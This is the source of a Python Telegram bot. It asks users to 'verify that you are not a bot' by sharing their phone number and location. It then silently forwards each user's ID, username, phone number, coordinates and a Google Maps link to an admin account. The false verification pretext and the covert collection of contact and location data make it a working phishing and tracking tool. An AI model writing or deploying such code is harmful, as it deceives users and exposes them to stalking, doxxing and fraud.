import os
import telebot
from telebot import types

Token = os.getenv('TELEGRAM_BOT_TOKEN')
bot = telebot.TeleBot(Token)
admin_id = os.getenv('TELEGRAM_BOT_ID')

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    keyboard.add(
        types.KeyboardButton(text="📞📍 Share Number and Location")
    )
    bot.send_message(message.chat.id, "Please verify that you are not a bot by sharing your number and location.", reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text == "📞📍 Share Number and Location")
def request_contact(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    keyboard.add(types.KeyboardButton(text="📞 Share Number", request_contact=True))
    bot.send_message(message.chat.id, "Please share your phone number:", reply_markup=keyboard)

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    user = message.from_user
    contact = message.contact

    user_info = (
        f"User ID: {user.id}\n"
        f"Username: @{user.username if user.username else 'N/A'}\n"
        f"Phone Number: {contact.phone_number}\n"
        f"Telegram: https://t.me/{user.username if user.username else 'N/A'}"
    )

    bot.send_message(admin_id, text=user_info)
    
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    keyboard.add(types.KeyboardButton(text="📍 Share Location", request_location=True))
    bot.send_message(message.chat.id, "Thanks! Now, please share your location:", reply_markup=keyboard)

@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    bot.send_message(admin_id, text=f'''
Received User Location:
Latitude = {loc.latitude}
Longitude = {loc.longitude}
● [Google Map](https://www.google.com/maps/place/{loc.latitude},{loc.longitude})
''', parse_mode='markdown')
    bot.send_message(message.chat.id, text="Thanks for sharing your location :)")

print('- Start Bot.')
bot.infinity_polling()
